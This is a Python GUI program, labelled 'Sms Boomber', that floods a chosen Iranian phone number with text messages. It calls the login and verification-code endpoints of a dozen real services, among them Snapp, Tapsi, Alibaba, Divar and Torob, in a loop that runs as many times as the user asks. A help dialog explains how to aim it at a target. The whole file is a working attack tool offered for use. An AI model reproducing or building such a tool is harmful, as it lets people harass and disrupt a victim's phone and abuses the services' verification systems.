
from requests import post , get
from time import sleep
from os import system , name
from tkinter import *
from tkinter import messagebox
import tkinter as tk
from tkinter import ttk
import webbrowser


stephen = Tk()
stephen.title('Hosein Stephen')
stephen.geometry('700x500')
stephen.resizable(False,False)
def clear():
    if name == 'nt':
        _ = system('cls')
    
    else:
        _ = system('clear')

stephen.configure(background='#020101')




sended = []


def start():
    looping_count = 0

    clear()
    print("\n\n")
    phone_number = entry1.get()
    sms_number = int(entry2.get())

    while looping_count <= sms_number:

        if entry2.get() in sended:
            pass
            
        
        else:

            looping_count = looping_count + 1
            
            snap(phone_number)
            sleep(1)
            tamland(phone_number)
            sleep(1)
            alibaba(phone_number)
            sleep(.5)
            tapsi(phone_number)
            sleep(1)
            divar(phone_number)
            sleep(1)
            sbm24(phone_number)
            sleep(.5)
            anten(phone_number)
            sleep(1)
            snap_doctor(phone_number)
            sleep(1)
            togmond(phone_number)
            sleep(.5)
            torob(phone_number)
            sleep(1)
            limited_sites(phone_number)
            sleep(1)
            snap_room(phone_number)
            
            
            
def snap(phone_number):
    try:
        phone_number = "+98" + phone_number
        data = {"cellphone":phone_number}
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            
        else:
            sended.append(0)
    except:
        sended.append(-1)
        


def tamland(phone_number):
    try:
        phone_number = "0" + phone_number
        

        data = {"Mobile":phone_number,"SchoolId":-1}
        url = "https://api.famiran.com/api/user/signup"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            
        else:
            sended.append(0)
    except:
        sended.append(-1)
        


def alibaba(phone_number):
    try:
        phone_number = phone_number
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        data = {"phoneNumber":phone_number}
        p = post(url, json=data, timeout=3)
        sleep(.01)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            
        else: 
            sended.append(0)
    except:
        sended.append(-1)

def tapsi(phone_number):
    try:
        phone_number = "0" + phone_number
        data = {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"}}
        url = "https://tap33.me/api/v2/user"
        p = post(url, json=data, timeout=2 )
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
        else:
            sended.append(0)
    except:
        sended.append(-1)

def divar(phone_number):
    try:
        phone_number = phone_number
        data = {"phone":phone_number}
        url = "https://api.divar.ir/v5/auth/authenticate"
        p = post(url, json=data, timeout=2)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
        else:
            sended.append(0)
    except:
        sended.append(-1)


def sbm24(phone_number):
    try:
        data = {}
        url = "https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0{}".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
        else:
            sended.append(0)
    except:
        sended.append(-1)



def snap_market(phone_number):
    try:

        data = {}
        url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{}&dummy=1603885783456".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
        else:
            sended.append(0)
    except:
        sended.append(-1)



def anten(phone_number):
    try:
        phone_number = '0'+phone_number
        data = {"phone":phone_number}
        url = "https://api2.anten.ir/users/"
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
        else:
            sended.append(0)
    except:
        sended.append(-1)


def snap_doctor(phone_number):
    try:
        url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+98)".format(phone_number)
        p = get(url, timeout=3)
        rp = p.json()
        rp = rp["result"]
        sleep(.01)
        if rp == "SUCCESS":
            sended.append(1)
    except:
        sended.append(-1)


def togmond(phone_number):
    try:
        phone_number = phone_number
        data = "utf8=%E2%9C%93&phone_number=0{}".format(phone_number)
        url = "https://tagmond.com/phone_number"
        p = post(url, data=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(2) 
        else:
            print("[-togmond] not send , error code: {}".format(p))
            sended.append(0)
    except:
        sended.append(-1)


def torob(phone_number):
    try:
        url = "https://api.torob.com/a/phone/send-pin/?phone_number=0{}".format(phone_number)
        p = get(url, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
        else:
            sended.append(0)
    except:
        sended.append(-1)


def limited_sites(phone_number):
    try:
        data = {"username":phone_number}     
        url = "https://www.tebinja.com/api/v1/users"
        post(url, json=data, timeout=1)
        sleep(.01)
    except:
        sended.append(2)
    
def snap_room(phone_number):
    try:
        data = {"username":"0"+phone_number}    
        url = "https://napi.snapproom.com/users/self/verification-flow"
        p = post(url, json=data, timeout=2)
        sleep(.01)
    except:
        sended.append(-1)

site_function = 13


def startt():
    if entry1.get() == "" or entry2 == "":
        messagebox.showerror('Error','First Import Number of phone and Number of message')
    else:
        messagebox.showinfo("Information",f"""Phone:+98 {entry1.get()}\nNumber of Message: {entry2.get()}\nStart(Don't Touch programs untill End)""")
    if __name__ == "__main__":
        start()
    if entry2.get() in sended:
        messagebox.showinfo("Information","\nDone, I Sended more than {} sms to +98 {}\n".format(entry2.get(), entry1.get()))


entry1= Entry(stephen,bg="#383535",fg="white",border=5,width=35)
entry2= Entry(stephen,bg="#383535",fg="white",border=5,width=35)
lbl1 = Label(stephen,text="Enter your number: +098",bg="black",fg="white",font="bold")
lbl2 = Label(stephen,text="Enter your Number of message:",bg="black",fg="white",font="bold")
btn1 = Button(stephen,text="Start",bg="black",fg="white",width=20,height=1,activebackground="#817b7b",activeforeground="black",command=startt)


menu = Menu(stephen,background='Black',foreground='white')
def menu_command(command):
    if command == "Clear":
        entry1.delete(0,END)
        entry2.delete(0,END)
    elif command == "Exit":
        if messagebox.askyesno("Confirm Exit", "Are you sure you want to exit?"):
            stephen.quit()
    elif command == "Help":
        messagebox.showinfo("How to use",f"""First put your number without any (0) at the first of the number \nNumber like:91234567890\nPut the number of message you wanna send for target\nLike:10\nNow send the 10 message to 91234567890""")
    elif command == "Creator":
        messagebox.showinfo("Info","This made by Hosein-Stephen\n\nGithub: Hosein-Stephen")
    else:
        pass

menu.add_command(label="Clear",command=lambda: menu_command("Clear"))
menu.add_command(label="Help", command=lambda: menu_command("Help"))
menu.add_command(label="Exit", command=lambda: menu_command("Exit"))
menu.add_command(label="Creator", command=lambda: menu_command("Creator"))

stephen.config(menu=menu)
if stephen.quit():
    messagebox.showerror("Error installer","You don't have any Microsoft Edge in your")
        
menu.configure(background="black")
lblname = Label(stephen,bg="black",fg="white",text="""
☆꧁༒☬Sms Boomber☬༒꧂☆                                          
""",font=("HORIZONTAL",'20','bold'))
entry2.place(x=255, y=310)
entry1.place(x=255,y=200)
lbl1.place(x=252,y=170)
lbl2.place(x=252, y=280)
btn1.place(x=290, y=245)
lblname.place(x=120,y=30)
stephen.mainloop()



